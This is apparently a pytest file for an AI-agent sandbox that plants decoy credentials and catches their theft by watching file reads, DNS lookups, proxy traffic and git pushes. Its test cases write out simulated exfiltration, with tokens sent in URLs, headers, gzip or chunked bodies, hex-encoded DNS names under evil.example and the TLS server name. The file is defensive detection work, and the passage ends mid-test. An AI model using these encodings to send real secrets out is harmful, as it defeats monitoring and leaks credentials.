"""Canary files: planting (never over a file, private modes, out of Git), what the supervisor sees (inotify, DNS),
what the proxy sees (URL, headers, body, encodings, TLS names), the push check, the launcher's actions and the
choices (options, project, defaults, policy, rulesets)."""
import argparse
import base64
import gzip
import importlib.util
import json
import os
from pathlib import Path
import re
import shutil
import signal
import socket
import ssl
import stat
import struct
import subprocess
import threading
import time
from unittest.mock import Mock
import urllib.parse

import pytest

ROOT = Path(__file__).resolve().parents[1]


def load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


c = load("sandbox_canary_test", ROOT / "sandbox/canary.py")
rt = load("sandbox_runtime_canary_test", ROOT / "sandbox/runtime.py")
privacy = load("sandbox_privacy_canary_test", ROOT / "sandbox/privacy.py")
s = load("agent_sandbox_canary_test", ROOT / "sandbox/agent_sandbox.py")
proxy_tests = load("proxy_tests_for_canaries", ROOT / "tests/test_proxy.py")
pki = proxy_tests.pki  # the fixture: a session CA and an upstream CA with a certificate for example.test


def namespace(tmp_path, **changes):
    work = tmp_path / "work"
    work.mkdir(exist_ok=True)
    home = tmp_path / "home"
    home.mkdir(mode=0o700, exist_ok=True)
    values = {"run_id": "codex-canary1", "agent": "codex", "backend": "podman", "state_dir": None,
              "workspaces": [str(work)], "workspace_ro": False, "mount": [], "kit_mounts": [],
              "canary_categories": ("credentials", "home", "workspace"), "rulesets": [], "frontier": False,
              "llm": None, "tmux_socket_dir": None, "pod_name": None}
    values.update(changes)
    return argparse.Namespace(**values), home, work


def git(*args, cwd):
    return subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True, text=True,
                          env={**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t", "GIT_COMMITTER_NAME": "t",
                               "GIT_COMMITTER_EMAIL": "t@t", "GIT_CONFIG_GLOBAL": "/dev/null"}).stdout


# --- tokens ---------------------------------------------------------------------------------------

def test_tokens_have_real_shapes_but_are_worthless():
    key, secret = c.aws_key_id(), c.aws_secret()
    assert re.fullmatch(r"AKIA[A-Z0-9]{9}EXAMPLE", key) and len(secret) == 40 and secret.endswith("EXAMPLEKEY")
    token = c.github_token()
    assert re.fullmatch(r"ghp_[A-Za-z0-9]{36}", token)
    body, checksum = token[4:34], token[34:]
    crc = __import__("zlib").crc32(body.encode())
    for alphabet in (c.DIGITS + c.UPPER + c.LOWER, c.DIGITS + c.LOWER + c.UPPER):
        assert checksum != c.base62(crc, alphabet)  # GitHub rejects it without a lookup
    # Secret scanners take them for credentials: the privacy check's own patterns match.
    shapes = {p.id: p.regex for p in privacy.builtin_rules().patterns}
    assert shapes["aws-access-key-id"].search(key) and shapes["github-token"].search(token)
    text, key_token = c.ssh_private_key()
    assert shapes["private-key"].search(text) and key_token in text.splitlines()[2]
    for spec in c.credential_files() + c.home_files() + [c.workspace_file(0)]:
        assert all(value in spec["content"] for value in spec["tokens"].values()), spec["id"]
        hosts = re.findall(r"(?:https?://|@|machine |^)([a-z0-9.-]+\.[a-z]+)(?::\d+)?(?:[/\s]|$)", spec["content"], re.M)
        assert all(host.endswith(".internal") or host.endswith("googleusercontent.com") for host in hosts), hosts


def test_each_canary_has_its_own_tokens():
    first, second = c.credential_files(), c.credential_files()
    assert {v for spec in first for v in spec["tokens"].values()}.isdisjoint(
        {v for spec in second for v in spec["tokens"].values()})


@pytest.mark.parametrize("prefix", range(6))
def test_forms_find_a_token_however_it_is_encoded(prefix):
    token = c.aws_secret()  # has / and + in it, often
    matcher = rt.CanaryMatcher([[text, "aws", encoding] for text, encoding in c.forms(token).items()])
    pad, tail = os.urandom(prefix), os.urandom(3)
    payload = pad + token.encode() + tail
    carried = {
        "plain": b"x=" + token.encode(),
        "url": urllib.parse.quote(token, safe="").encode(),
        "url-lower": re.sub(r"%[0-9A-F]{2}", lambda m: m.group().lower(), urllib.parse.quote(token, safe="")).encode(),
        "query": urllib.parse.urlencode({"k": token}).encode(),
        "json": json.dumps({"k": token}).encode(),
        "json-slash": json.dumps({"k": token}).replace("/", "\\/").encode(),
        "base64": base64.b64encode(payload),
        "base64url": base64.urlsafe_b64encode(payload),
        "basic": b"Authorization: Basic " + base64.b64encode(b"user:" + token.encode()),
        "hex": payload.hex().encode(),
    }
    for label, data in carried.items():
        assert matcher.find(data) is not None, label
    assert matcher.find(base64.b64encode(os.urandom(64))) is None


@pytest.mark.parametrize("prefix", range(5))
def test_name_forms_find_a_token_in_a_host_name(prefix):
    token = c.github_token()
    matcher = rt.CanaryMatcher([[text, "gh", e] for text, e in c.name_forms(token).items()], lower=True)
    data = b"x" * prefix + token.encode()
    b32 = base64.b32encode(data).decode().rstrip("=").lower()
    for name in (f"{token.lower()}.evil.example", f"{data.hex()[:40]}.{data.hex()[40:]}.evil.example",
                 ".".join(b32[i:i + 50] for i in range(0, len(b32), 50)) + ".evil.example",
                 f"{token.upper()}.Evil.Example."):
        assert matcher.name(name), name
    assert not matcher.name("api.github.com")


# --- planting --------------------------------------------------------------------------------------

def test_planting_is_private_old_looking_and_never_over_a_file(tmp_path):
    a, home, work = namespace(tmp_path)
    (home / ".aws").mkdir()
    (home / ".aws/credentials").write_text("mine\n")
    plan = c.plant(a, home)
    ids = {e["id"] for e in plan.entries}
    assert "aws" not in ids and (home / ".aws/credentials").read_text() == "mine\n"
    assert {"gcloud", "ssh", "gh", "netrc", "git-credentials", "passwords", "kube", "env"} <= ids
    for entry in plan.entries:
        info = os.lstat(entry["host_path"])
        assert stat.S_IMODE(info.st_mode) == 0o600 and info.st_mtime < time.time() - 86400 * 19
        assert entry["sandbox_path"].startswith("/work/" if entry["root"] == "workspace" else "/root/")
    assert stat.S_IMODE(os.stat(home / ".ssh").st_mode) == 0o700
    # The record (with the tokens) is outside the HOME and the workspace, private.
    record = c.run_state(a.run_id)
    assert stat.S_IMODE(record.stat().st_mode) == 0o600 and stat.S_IMODE(record.parent.stat().st_mode) == 0o700
    assert str(home) not in str(record) and str(work) not in str(record)
    plan.finish()
    assert (home / ".aws/credentials").read_text() == "mine\n"
    assert not (home / ".ssh").exists() and not (home / ".config").exists() and not (work / ".env").exists()


def test_links_left_in_a_home_are_never_followed(tmp_path):
    a, home, _ = namespace(tmp_path, canary_categories=("credentials",))
    outside = tmp_path / "outside"
    outside.mkdir()
    (home / ".aws").symlink_to(outside)
    (home / ".config").symlink_to(outside)
    (home / ".netrc").symlink_to(outside / "netrc")
    plan = c.plant(a, home)
    assert list(outside.iterdir()) == []
    assert {e["id"] for e in plan.entries} == {"ssh", "git-credentials"}
    plan.finish()


def test_workspace_canary_stays_out_of_git_and_goes_at_the_end(tmp_path):
    a, home, work = namespace(tmp_path, canary_categories=("workspace",))
    git("init", "-q", cwd=work)
    (work / "app.py").write_text("print(1)\n")
    (work / ".git/info").mkdir(exist_ok=True)
    (work / ".git/info/exclude").write_text("*.log")  # no newline at the end
    plan = c.plant(a, home)
    assert [e["id"] for e in plan.entries] == ["env"] and (work / ".env").exists()
    assert ".env" not in git("status", "--porcelain", "--ignored=no", cwd=work)
    git("add", "-A", cwd=work)
    assert ".env" not in git("diff", "--cached", "--name-only", cwd=work)
    assert (work / ".git/info/exclude").read_text().startswith("*.log\n# sandbox-ai canary (codex-canary1)")
    plan.finish()
    assert not (work / ".env").exists() and (work / ".git/info/exclude").read_text() == "*.log\n"


def test_a_workspace_file_of_that_name_is_left_alone(tmp_path):
    a, home, work = namespace(tmp_path, canary_categories=("workspace",))
    (work / ".env").write_text("REAL=1\n")
    assert c.plant(a, home) is not None and (work / ".env").read_text() == "REAL=1\n"
    a, home, work = namespace(tmp_path, canary_categories=("workspace",), workspace_ro=True)
    (work / ".env").unlink()
    plan = c.plant(a, home)
    assert plan.entries == [] and any("--workspace-ro" in n for n in plan.notes)


def test_a_killed_run_is_tidied_up_by_the_next(tmp_path, monkeypatch):
    a, home, work = namespace(tmp_path, canary_categories=("workspace",))
    git("init", "-q", cwd=work)
    plan = c.plant(a, home)
    record = json.loads(c.run_state(a.run_id).read_text())
    record["pid"] = 2 ** 22 + 1  # a launcher that is gone
    c.write_json(c.run_state(a.run_id), record)
    assert (work / ".env").exists()
    notes = c.tidy()
    assert notes and not (work / ".env").exists() and "canary" not in (work / ".git/info/exclude").read_text()
    assert json.loads(c.run_state(a.run_id).read_text())["status"] == "abandoned"
    del plan


def test_a_kept_home_keeps_its_canaries(tmp_path):
    a, home, _ = namespace(tmp_path, canary_categories=("credentials",), state_dir=str(tmp_path / "home"))
    first = c.plant(a, home)
    tokens = {e["id"]: e["tokens"] for e in first.entries}
    first.finish()
    assert (home / ".aws/credentials").exists()  # kept with the HOME
    (home / ".netrc").unlink()  # gone: planted again, the same
    (home / ".git-credentials").write_text("changed by someone\n")  # changed: no canary any more, left alone
    second = c.plant(argparse.Namespace(**{**vars(a), "run_id": "codex-canary2"}), home)
    again = {e["id"]: e["tokens"] for e in second.entries}
    assert again["aws"] == tokens["aws"] and again["netrc"] == tokens["netrc"] and "git-credentials" not in again
    assert (home / ".git-credentials").read_text() == "changed by someone\n"
    assert any(".git-credentials changed" in n for n in second.notes)
    second.finish()
    # Off for this HOME: the unchanged ones go, the changed one stays.
    third = c.plant(argparse.Namespace(**{**vars(a), "run_id": "codex-canary3", "canary_categories": ()}), home)
    assert not (home / ".aws/credentials").exists() and (home / ".git-credentials").exists()
    third.finish()


def test_a_mount_on_top_hides_nothing(tmp_path):
    a, home, _ = namespace(tmp_path, canary_categories=("credentials",), mount=[f"{tmp_path}:/root/.ssh:ro"],
                           kit_mounts=[(tmp_path, "/root/.config/gh", "ro")])
    plan = c.plant(a, home)
    ids = {e["id"] for e in plan.entries}
    assert "ssh" not in ids and "gh" not in ids and "aws" in ids
    plan.finish()


# --- choices --------------------------------------------------------------------------------------

def test_categories_from_options_project_defaults_and_policy(tmp_path, monkeypatch):
    ws = str(tmp_path)
    parse = lambda *args: s.parse_args(["codex", "--no-config", "-w", ws, *args])
    assert c.categories(parse()) == ("credentials", "home")  # the default
    assert c.categories(parse("--canaries", "all")) == c.CATEGORIES
    assert c.categories(parse("-cn", "workspace,home")) == ("home", "workspace")
    assert c.categories(parse("--no-canaries")) == ()
    assert c.categories(parse("-nn")) == ()
    assert c.categories(parse("--probe")) == ()
    with pytest.raises(ValueError, match="categories are"):
        c.categories(parse("--canaries", "creds"))
    a = parse()
    a.canary_default = ["home"]
    assert c.categories(a) == ("home",)
    a = parse("--canaries", "workspace")
    a.canary_default = False
    assert c.categories(a) == ("workspace",)  # the option wins over the defaults file
    a = parse("--no-canaries")
    a.require_canaries = True
    with pytest.raises(ValueError, match="requires canary files"):
        c.categories(a)
    a = parse("--canaries", "home")
    a.require_canaries = ["workspace"]
    assert c.categories(a) == ("home", "workspace")
    a = parse()
    a.canary_default, a.require_canaries = False, True
    assert c.categories(a) == ("credentials", "home")
    assert c.check_policy_value(True) and c.check_policy_value(["home"]) and not c.check_policy_value(["x"])
    assert not c.check_policy_value("yes")


def test_project_key_and_defaults_file(tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "config"))
    work = tmp_path / "w"
    work.mkdir()
    config = work / s.CONFIG_NAME
    config.write_text(json.dumps({"version": 1, "agent": "codex", "canaries": ["workspace", "credentials"]}))
    s.trust_config(config)
    a = s.parse_args(["codex", "--workspace", str(work)])
    _, document = s.load_project_config(a)
    merged = s.parse_args(s.merge_config(["codex", "--workspace", str(work)], a, document))
    assert c.categories(merged) == ("credentials", "workspace")
    merged = s.parse_args(s.merge_config(["codex", "--workspace", str(work), "--no-canaries"], a, document))
    assert c.categories(merged) == ()  # the command line wins
    config.write_text(json.dumps({"version": 1, "agent": "codex", "canaries": "all"}))
    s.trust_config(config)
    with pytest.raises(ValueError, match="canaries is false or a list"):
        s.load_project_config(a)
    defaults = tmp_path / "config/sandbox-ai/defaults.json"
    defaults.parent.mkdir(parents=True, exist_ok=True)
    defaults.write_text(json.dumps({"version": 1, "canaries": False}))
    assert s.load_user_defaults(a) == {"version": 1, "canaries": False}
    defaults.write_text(json.dumps({"version": 1, "canaries": ["nope"]}))
    with pytest.raises(ValueError, match="categories are"):
        s.load_user_defaults(a)


def test_policy_require_canaries_and_forbid(tmp_path, monkeypatch):
    policy = {"version": 1, "require_canaries": ["workspace"], "forbid": ["--no-canaries"]}
    a = s.parse_args(["codex", "--no-config", "-w", str(tmp_path), "--no-canaries"])
    with pytest.raises(ValueError, match="--no-canaries is not allowed"):
        s.check_policy(a, policy)
    a = s.parse_args(["codex", "--no-config", "-w", str(tmp_path)])
    s.check_policy(a, policy)
    assert c.categories(a) == ("credentials", "home", "workspace")
    contracts = load("contracts_for_canaries", ROOT / "tests/test_agent_sandbox_contracts.py")
    path = contracts.policy_file(tmp_path, {"version": 1, "require_canaries": "yes"}, monkeypatch)
    with pytest.raises(ValueError, match="require_canaries is true, false or a list"):
        s.load_policy(path)
    path = contracts.policy_file(tmp_path, {"version": 1, "require_canaries": ["home"]}, monkeypatch)
    assert s.load_policy(path)["require_canaries"] == ["home"]


def test_rulesets_decide_the_strictest():
    assert c.decisions([]) == {"on_read": "report", "on_send": "stop", "by": {}}
    rules = [{"name": "policy", "canary": {"on_send": "block"}}, {"name": "rules.json", "canary": {"on_read": "pause"}},
             {"name": "project", "canary": {"on_read": "ask", "on_send": "report"}}]
    assert c.decisions(rules) == {"on_read": "pause", "on_send": "block",
                                  "by": {"on_read": "rules.json", "on_send": "policy"}}
    assert rt.Ruleset.validated({"version": 1, "canary": {"on_read": "stop"}}, "x")["canary"] == {"on_read": "stop"}
    assert "canary" not in rt.Ruleset.validated({"version": 1}, "x")
    for bad in ({"on_read": "block"}, {"on_send": "ask"}, {"when": "x"}, {}, "stop"):
        with pytest.raises(rt.RuleError, match='"canary" takes'):
            rt.Ruleset.validated({"version": 1, "canary": bad}, "x")
    # A ruleset with only a canary section passes the launcher's checks, and the proxy is not bothered with it.
    a = s.parse_args(["codex", "--no-config", "-w", "/nonexistent-ws", "--telemetry", "on"])  # no ruleset of its own
    a.policy_rules, a.project_document = {"version": 1, "canary": {"on_read": "ask"}}, None
    assert c.decisions(s.load_rulesets(a))["on_read"] == "ask"
    assert s.proxy_rules(a, {}) == {}


# --- the supervisor: files and names --------------------------------------------------------------

def events(directory, until=None, wait=3.0):
    path = Path(directory) / rt.CANARY_EVENTS
    deadline = time.monotonic() + wait
    while True:
        found = [json.loads(line) for line in path.read_text().splitlines()] if path.exists() else []
        if (until is None and found) or (until is not None and until(found)) or time.monotonic() > deadline:
            return found
        time.sleep(0.05)


def test_the_supervisor_sees_reads_changes_renames_and_deletes(tmp_path):
    root = tmp_path / "root"
    (root / ".aws").mkdir(parents=True)
    canary, other = root / ".aws/credentials", root / ".aws/config"
    canary.write_text("[x]\n")
    other.write_text("[y]\n")
    control = tmp_path / "control"
    control.mkdir()
    (control / rt.CANARY_CONFIG).write_text(json.dumps({"files": [{"id": "aws", "path": str(canary), "reads": "alert"}],
                                                        "names": []}))
    watcher = rt.Canaries.load(control).start()
    try:
        time.sleep(0.2)
        os.stat(canary)  # a stat is no read
        other.read_text()  # nor is a file next to it
        assert events(control, wait=0.5) == []
        canary.read_text()
        canary.read_text()  # once within a few seconds
        found = events(control, until=lambda f: any(e["event"] == "read" for e in f))
        assert [(e["event"], e["canary"], e["path"]) for e in found] == [("read", "aws", str(canary))]
        os.rename(canary, root / ".aws/old")
        (root / ".aws/old").unlink()
        found = events(control, until=lambda f: {"move", "delete"} <= {e["event"] for e in f})
        assert {"move", "delete"} <= {e["event"] for e in found}
    finally:
        watcher.close()
    assert not watcher.thread.is_alive()


def test_the_supervisor_reports_a_file_it_cannot_watch(tmp_path):
    (tmp_path / rt.CANARY_CONFIG).write_text(json.dumps({"files": [{"id": "x", "path": str(tmp_path / "missing")}]}))
    watcher = rt.Canaries.load(tmp_path).start()
    try:
        found = events(tmp_path)
        assert found[0]["event"] == "error" and found[0]["canary"] == "x"
    finally:
        watcher.close()
    assert rt.Canaries.load(tmp_path / "none") is None


def test_dns_stub_reports_a_token_in_a_lookup(tmp_path, monkeypatch):
    token = c.github_token()
    control = tmp_path / "control"
    control.mkdir()
    (control / rt.CANARY_CONFIG).write_text(json.dumps({"files": [], "names": [
        [text, "gh", e] for text, e in c.name_forms(token).items()]}))
    canaries = rt.Canaries.load(control)
    monkeypatch.setattr(rt, "LOG_DIR", tmp_path)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
        probe.bind(("127.0.0.1", 0))
        port = probe.getsockname()[1]
    stop = threading.Event()
    thread = threading.Thread(target=rt.dns_logger, args=(set(), port, stop, None, (), None, canaries), daemon=True)
    thread.start()
    time.sleep(0.2)
    name = token.encode().hex()[:60] + "." + token.encode().hex()[60:] + ".exfil.example"

    def query(host):
        question = b"".join(bytes([len(p)]) + p.encode() for p in host.split(".")) + b"\0\0\1\0\1"
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
            client.settimeout(2)
            client.sendto(struct.pack("!HHHHHH", 7, 0x100, 1, 0, 0, 0) + question, ("127.0.0.1", port))
            return client.recv(512)
    try:
        assert query("pypi.org")[3] & 0xF == 3  # NXDOMAIN, nothing found
        assert query(name)[3] & 0xF == 3
        found = events(control)
        assert [(e["event"], e["source"], e["canary"], e["encoding"]) for e in found] == [("send", "dns", "gh", "hex")]
    finally:
        stop.set()
        thread.join(3)


# --- the proxy ------------------------------------------------------------------------------------

class Who:
    """Stands in for the supervisor's channel: records what the proxy reports."""

    def __init__(self):
        self.requests = []

    def request(self, kind, details):
        if kind != "who":
            self.requests.append((kind, details))
        pending = proxy_tests.rt.Pending(argparse.Namespace(waiting={}), 1)  # the proxy's own module
        pending.answer = {"process": {"comm": "curl"}}
        pending.event.set()
        return pending


def canary_proxy(tmp_path, pki, tokens, block=True, models=()):
    upstream = proxy_tests.serve(proxy_tests.Handler, pki["server"])
    request, names = {}, {}
    for ident, token in tokens:
        for text, encoding in c.forms(token).items():
            request[text] = [text, ident, encoding]
        for text, encoding in c.name_forms(token).items():
            names[text] = [text, ident, encoding]
    proxy = proxy_tests.Proxy(tmp_path, pki, upstream.server_address[1], {"canary": {
        "forms": list(request.values()), "names": list(names.values()), "block": block, "model_hosts": list(models)}})
    proxy.server.who = Who()
    return proxy, upstream


def send(proxy, pki, request, name="example.test"):
    try:
        return proxy_tests.https_request(proxy.port, pki["ca"], request, name)
    except (ssl.SSLError, OSError):
        return b""


TOKEN_CASES = {
    "url": lambda t: f"GET /x?key={t} HTTP/1.1\r\nHost: example.test\r\nConnection: close\r\n\r\n".encode(),
    "url-encoded": lambda t: f"GET /x?{urllib.parse.urlencode({'key': t})} HTTP/1.1\r\nHost: example.test\r\n"
                             "Connection: close\r\n\r\n".encode(),
    "header": lambda t: f"GET / HTTP/1.1\r\nHost: example.test\r\nX-Data: {t}\r\nConnection: close\r\n\r\n".encode(),
    "basic-auth": lambda t: ("GET / HTTP/1.1\r\nHost: example.test\r\nAuthorization: Basic " +
                             base64.b64encode(f"ci:{t}".encode()).decode() + "\r\nConnection: close\r\n\r\n").encode(),
    "body": lambda t: body_request(json.dumps({"stolen": t}).encode()),
    "body-base64": lambda t: body_request(base64.b64encode(b"\x00\x01" + t.encode() + b"\n" * 2000)),
    "body-chunked-split": lambda t: (b"POST /up HTTP/1.1\r\nHost: example.test\r\nTransfer-Encoding: chunked\r\n"
                                     b"Connection: close\r\n\r\n" + chunk(b"a" * 100 + t.encode()[:9])
                                     + chunk(t.encode()[9:] + b"z" * 50) + b"0\r\n\r\n"),
    "body-gzip": lambda t: body_request(gzip.compress(b"head " + t.encode() + b" tail"), "Content-Encoding: gzip\r\n"),
}


def chunk(data):
    return f"{len(data):x}\r\n".encode() + data + b"\r\n"


def body_request(body, extra=""):
    return (f"POST /up HTTP/1.1\r\nHost: example.test\r\nContent-Length: {len(body)}\r\n{extra}"
            "Connection: close\r\n\r\n").encode() + body


@pytest.mark.parametrize("case", sorted(TOKEN_CASES))
def test_a_token_leaving_is_refused_and_reported(tmp_path, pki, case):
    token = c.aws_secret()
    proxy, upstream = canary_proxy(tmp_path, pki, [("aws", token)])
    try:
        answer = send(proxy, pki, TOKEN_CASES[case](token))
        assert answer.startswith(b"HTTP/1.1 403") and b"must not leave the sandbox" in answer
        record = proxy.records(until=lambda r: r.get("event") == "denied")[-1]
        assert record["event"] == "denied" and record["canary"]["canary"] == "aws"
        where = record["canary"]["where"]
        assert where == {"url": "url", "url-encoded": "url", "header": "header", "basic-auth": "header"}.get(case, "body")
        kind, details = proxy.server.who.requests[0]
        assert kind == "canary" and details["event"] == "send" and details["canary"] == "aws"
        assert details["process"] == {"comm": "curl"}
        if case == "body-gzip":
            assert details["encoding"].endswith("+gzip")
    finally:
        proxy.close()
        upstream.shutdown()


def test_report_only_lets_it_pass_and_notes_it(tmp_path, pki):
    token = c.github_token()
    proxy, upstream = canary_proxy(tmp_path, pki, [("gh", token)], block=False)
    try:
        answer = send(proxy, pki, body_request(f"token={token}".encode()))
        assert answer.startswith(b"HTTP/1.1 201") and token.encode() in answer
        record = proxy.records(until=lambda r: r.get("event") == "http")[-1]
        assert record["canary"] == {"canary": "gh", "encoding": "plain", "where": "body"}
        assert proxy.server.who.requests[0][1]["event"] == "send"
    finally:
        proxy.close()
        upstream.shutdown()


def test_a_token_in_a_model_request_entered_the_conversation(tmp_path, pki):
    """The agent read a canary and its model request carries it: reported (once) as context, never blocked."""
    token = c.aws_key_id()
    proxy, upstream = canary_proxy(tmp_path, pki, [("aws", token)], models=["example.test"])
    try:
        for _ in range(2):
            answer = send(proxy, pki, body_request(json.dumps({"messages": [{"content": token}]}).encode()))
            assert answer.startswith(b"HTTP/1.1 201")
        sent = [d for k, d in proxy.server.who.requests if k == "canary"]
        assert [d["event"] for d in sent] == ["context"]
    finally:
        proxy.close()
        upstream.shutdown()


def test_a_token_in_the_tls_name_is_refused(tmp_path, pki):
    token = c.github_token()
    proxy, upstream = canary_proxy(tmp_path, pki, [("gh", token)])
    try:
        hexed = token.encode().hex()
        assert send(proxy, pki, b"GET / HTTP/1.1\r\n\r\n", name=f"{hexed[:40]}.{hexed[40:]}.example.test") == b""
        record = proxy.records(until=lambda r: r.get("event") == "denied")[-1]
        assert record["canary"]["where"] == "sni" and record["canary"]["encoding"] == "hex"
    finally:
        proxy.close()
        upstream.shutdown()


def test_ordinary_traffic_passes_and_a_split_token_is_a_known_limit(tmp_path, pki):
    token = c.aws_secret()
    proxy, upstream = canary_proxy(tmp_path, pki, [("aws", token)])
    try:
        assert send(proxy, pki, body_request(b"hello " * 1000)).startswith(b"HTTP/1.1 201")
        # Half a token in each of two requests: neither carries the token (documented limit).
        assert send(proxy, pki, body_request(token[:20].encode())).startswith(b"HTTP/1.1 201")
        assert send(proxy, pki, body_request(token[20:].encode())).startswith(b"HTTP/1.1 201")
        assert proxy.server.who.requests == []
    finally:
        proxy.close()
        upstream.shutdown()


# --- the push check -------------------------------------------------------------------------------

def push_setup(tmp_path, content):
    work = tmp_path / "w"
    work.mkdir(parents=True)
    git("init", "-q", "-b", "main", cwd=work)
    (work / "notes.txt").write_text(content)
    git("add", "-A", cwd=work)
    git("commit", "-qm", "x", cwd=work)
    head = git("rev-parse", "HEAD", cwd=work).strip()
    return work, {"url": "https://git.corp.internal/team/app", "commands": [["0" * 40, head, "refs/heads/main"]],
                  "advertised": []}


@pytest.mark.parametrize("block", [True, False])
def test_the_push_check_finds_canary_tokens_for_any_remote(tmp_path, block):
    token = c.aws_key_id()
    work, request = push_setup(tmp_path, f"key = {token}\n")
    config = {"mode": "public", "own_hosts": [], "workspaces": [{"path": str(work), "rules": {"pattern": []}}],
              "canaries": [{"id": "aws", "tokens": [token]}], "canary_block": block}
    verdict = privacy.push_verdict(config, request)
    assert verdict["canary"] == ["aws"] and verdict["ok"] is (not block)
    assert token not in json.dumps(verdict)
    clean, request = push_setup(tmp_path / "clean", "nothing\n")
    config["workspaces"] = [{"path": str(clean), "rules": {"pattern": []}}]
    assert privacy.push_verdict(config, request) == {"ok": True, "message": "not a public remote"}
    assert privacy.push_verdict({**config, "canaries": []}, request) == {"ok": True, "message": "not a public remote"}


def test_the_proxy_reports_what_the_push_check_found():
    server = argparse.Namespace(who=Who(), asked_by=lambda record: {})
    entry = {"url": "https://x/y"}
    rt.canary_push(server, {"ok": False, "canary": ["aws"]}, entry, {})
    assert server.who.requests[0][1]["source"] == "push" and entry["canary"] == {"canary": "aws", "where": "push"}


# --- the launcher's side --------------------------------------------------------------------------

class Launcher:
    PROVIDERS, FRONTIER = s.PROVIDERS, s.FRONTIER

    def __init__(self):
        self.commands, self.signals = [], []

    def podman_command(self, a, *args):
        return ["podman", *args]

    def load_sessions_module(self):
        return argparse.Namespace(signal_tree=lambda pid, sig: self.signals.append((pid, sig)))

    def load_rulesets(self, a):
        return a.rulesets

    def workspace_targets(self, a):
        return [(a.workspaces[0], "/work")]

    @staticmethod
    def parse_mount(value):
        return s.parse_mount(value)


def armed(tmp_path, rulesets=(), **changes):
    a, home, work = namespace(tmp_path, canary_categories=("credentials",), rulesets=list(rulesets), **changes)
    a.running_pod = "agent-codex-abc"
    launcher, notices, killed, runs = Launcher(), [], [], []
    plan = c.plant(a, home, launcher, notify=lambda title, text: notices.append(text),
                   question=lambda title, text, ident: notices.append(f"Q {ident}"),
                   kill=lambda pid, sig: killed.append(sig), runner=lambda command, **kw: runs.append(command))
    control, logs = tmp_path / "control", tmp_path / "logs"
    control.mkdir()
    logs.mkdir()
    (control / "run.json").write_text(json.dumps({"run": a.run_id, "workspace": str(work)}))
    plan.arm(control, logs)
    plan.stopping.set()  # driven by hand: poll()
    return plan, control, logs, notices, killed, runs


def report(control, **event):
    with open(control / c.EVENTS_NAME, "a") as stream:
        stream.write(json.dumps(event) + "\n")


def test_the_supervisor_gets_the_list_where_the_agent_cannot_look(tmp_path, monkeypatch):
    plan, control, *_ = armed(tmp_path)
    config = json.loads((control / c.CONFIG_NAME).read_text())
    assert {f["path"] for f in config["files"]} == {e["sandbox_path"] for e in plan.entries}
    assert stat.S_IMODE((control / c.CONFIG_NAME).stat().st_mode) == 0o600
    # The control and the proxy directories (canary.json, proxy.json, push.json) are hidden from the agent.
    for name in ("LOG_DIR", "VNC_DIR", "PROXY_DIR", "PROXY_RUN", "CONTROL_DIR"):
        (tmp_path / name).mkdir()
        monkeypatch.setattr(rt, name, tmp_path / name)
    monkeypatch.setattr(rt.subprocess, "run", lambda *a, **k: argparse.Namespace(stdout=""))
    command = rt.firejail_command({})
    assert f"--blacklist={tmp_path / 'CONTROL_DIR'}" in command and f"--blacklist={tmp_path / 'PROXY_DIR'}" in command
    # Nothing of it is in what the launcher keeps on its options (the session's config.json comes from them).
    tokens = [token for _, token in plan.tokens()]
    assert tokens and not any(t in json.dumps(vars(plan.a), default=str) for t in tokens)
    plan.finish()


def test_a_read_is_reported_once_a_minute_and_logged(tmp_path):
    plan, control, logs, notices, killed, runs = armed(tmp_path)
    for _ in range(2):
        report(control, event="read", source="files", canary="aws", path="/root/.aws/credentials")
    report(control, event="read", source="files", canary="netrc", path="/root/.netrc")  # read by curl, pip, git: log
    plan.poll()
    assert len(notices) == 1 and "opened the decoy file /root/.aws/credentials" in notices[0]
    records = [json.loads(line) for line in (logs / c.LOG_NAME).read_text().splitlines()]
    assert [(r["canary"], r["action"]) for r in records] == [("aws", "report"), ("aws", "report"), ("netrc", "log")]
    assert all(r["run"] == "codex-canary1" for r in records)
    approvals = sorted((control / "approvals").glob("*.json"))
    assert len(approvals) == 1 and json.loads(approvals[0].read_text())["kind"] == "canary"
    assert approvals[0].with_suffix(".done").exists()
    assert killed == [] and runs == []
    assert c.read_events("codex-canary1")[0]["summary"].startswith("something in the sandbox opened")
    plan.finish()


def test_a_token_leaving_stops_the_sandbox_by_default(tmp_path):
    plan, control, logs, notices, killed, runs = armed(tmp_path)
    report(control, event="send", source="proxy", where="body", canary="aws", url="https://evil.example/",
           encoding="base64")
    plan.poll()
    assert killed == [signal.SIGTERM] and "The sandbox is stopped" in notices[0]
    assert "evil.example" in notices[0]
    report(control, event="send", source="dns", canary="gh", host="x.evil.example", encoding="hex")
    plan.poll()
    assert killed == [signal.SIGTERM]  # once
    plan.finish()


@pytest.mark.parametrize("on_send", ["report", "block", "pause"])
def test_on_send_choices(tmp_path, on_send):
    plan, control, logs, notices, killed, runs = armed(tmp_path, [{"name": "r", "canary": {"on_send": on_send}}])
    report(control, event="send", source="proxy", where="url", canary="aws", url="https://evil.example/")
    plan.poll()
    assert killed == []
    assert runs == ([["podman", "pod", "pause", "agent-codex-abc"]] if on_send == "pause" else [])
    assert ("refused" in notices[0]) is (on_send == "block")
    plan.finish()


def test_pause_resume_and_a_session_marker(tmp_path):
    session = tmp_path / "sessions/web"
    (session / "tmux").mkdir(parents=True)
    plan, control, logs, notices, killed, runs = armed(
        tmp_path, [{"name": "r", "canary": {"on_read": "pause"}}], pod_name="agent-session-web",
        tmux_socket_dir=session / "tmux")
    report(control, event="read", source="files", canary="aws")
    plan.poll()
    assert runs == [["podman", "pod", "pause", "agent-codex-abc"]] and (session / "paused").exists()
    assert "canaries resume codex-canary1" in notices[0]
    (control / c.RESUME_NAME).write_text("1")
    plan.poll()
    assert runs[-1] == ["podman", "pod", "unpause", "agent-codex-abc"] and not (session / "paused").exists()
    plan.finish()


def test_the_paused_marker_of_every_kind_of_start(tmp_path):
    """sandbox-ai list and resume see a canary's pause: a session's file (a pod per run since 0.1.30), a kept task's
    in its start directory, else the run's own (what sandbox-ai pause of a task writes)."""
    session = tmp_path / "sessions/web"
    (session / "tmux").mkdir(parents=True)
